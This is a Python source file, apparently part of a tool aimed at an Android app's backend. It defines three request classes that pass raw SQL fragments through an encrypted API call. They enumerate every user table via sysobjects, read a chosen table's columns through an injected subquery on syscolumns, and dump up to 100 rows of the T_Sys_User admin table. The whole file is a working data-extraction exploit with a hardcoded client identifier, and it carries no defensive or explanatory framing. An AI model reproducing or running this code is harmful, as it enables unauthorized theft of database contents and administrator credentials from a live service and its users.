"""
@Time: 2024/5/21 23:50
@Auth: EnderTheCoder
@Email: ggameinvader@gmail.com
@File: sys_request.py
@IDE: PyCharm
@Motto：The only one true Legendary Grandmaster.
"""
from request import EncryptedRequest


class DumpTablesRequest(EncryptedRequest):
    def __init__(self):
        super().__init__({
            'uuid': 'wdrunandroid_134453',
            'cols': '* ',
            'tablename': 'sysobjects ',
            'strwhere': f"and xtype='u'"
        })


class FetchTableRequest(EncryptedRequest):
    def __init__(self, table_name):
        super().__init__({
            'uuid': 'wdrunandroid_134453',
            'cols': '* ',
            'tablename': 'syscolumns ',
            'strwhere': f"and id=(select max(id) from sysobjects where xtype='u' and name='{table_name}')"
        })


class DumpAdminUser(EncryptedRequest):
    def __init__(self):
        super().__init__({
            'uuid': 'wdrunandroid_134453',
            'cols': 'top 100 *',
            'tablename': 'T_Sys_User',
        })
